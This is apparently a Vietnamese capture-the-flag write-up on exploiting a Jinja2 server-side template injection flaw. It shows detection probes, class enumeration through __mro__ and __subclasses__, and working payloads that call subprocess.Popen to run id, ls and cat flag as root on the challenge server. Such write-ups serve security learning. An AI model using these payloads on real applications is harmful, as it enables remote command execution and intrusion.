![alt text](image.png)
## 1.Enumeration
Trang chủ 
![alt text](image-1.png)
Ta phát hiện có lỗ hổng SSTI Template
Với input 
```bash
{{7*7}}
```
Ta thu được kết quả 
```bash
49
```
![alt text](image-2.png)
Với đầu vào 
```bash
{{7*'7'}}
```
Thu được kết quả 
```bash
7777777
```
![alt text](image-3.png)

**-> Đây khả năng là lỗ hổng SSTI trong framework Jinja2 Python**

## 2.Exploit
Xác địnhxem ta có thể thấy được  danh sách các lớp của Mro
```bash
{{ ''.__class__.__mro__ }}
```
Thu được kết quả 
```bash
(<class 'str'>, <class 'object'>)
```
![alt text](image-4.png)

Tìm danh sách các class con  có thể sử dụng được của lớp object() để khai thác SSTI.
Trỏ đến vị trí của object và liệt kê các lớp trong subclasses .
Ta tìm  thấy vị trí của subprocess.Popen lớp thực thi lệnh hệ thống  ở trong danh sách lớp con con của  __subclasses__()
Với khoảng chỉ số từ 350 đến 400 ta tìm được class subprocess.Popen .
```bash
{{''.__class__.__mro__[1].__subclasses__()[350:400]}}
```
![alt text](image-5.png)

&rarr; **subprocess.Popen ở vị trí 356** 
```bash
{{''.__class__.__mro__[1].__subclasses__()[356]}}
```
![alt text](image-6.png)

Ta gọi lớp subprocess.Popen và thực thi câu lệnh id 
```bash
{{''.__class__.__mro__[1].__subclasses__()[356]('id', shell=True, stdout=-1).communicate()[0]}}
```
Kết quả trả về là câu lệnh đã được thực thi 
```bash
b'uid=0(root) gid=0(root) groups=0(root)\n'
```
![alt text](image-7.png)
Kiểm tra các thư mục hiện tại trên hệ thống bằng câu lệnh ls -la

```bash
{{''.__class__.__mro__[1].__subclasses__()[356]('ls -la', shell=True, stdout=-1).communicate()[0]}}
```

Kết quả thu được ta tìm được file chứa cờ là flag

```bash
b'total 12\ndrwxr-xr-x 1 root root 25 Mar 10 12:37 .\ndrwxr-xr-x 1 root root 23 Mar 10 12:37 ..\ndrwxr-xr-x 2 root root 32 Mar 10 12:37 __pycache__\n-rwxr-xr-x 1 root root 1241 Mar 6 03:27 app.py\n-rw-r--r-- 1 root root 58 Mar 6 19:43 flag\n-rwxr-xr-x 1 root root 268 Mar 6 03:27 requirements.txt\n'
```
![alt text](image-8.png)

Thực thi câu lệnh cat flag ta thu được cờ 

```bash
{{''.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0]}}
```
![alt text](image-9.png)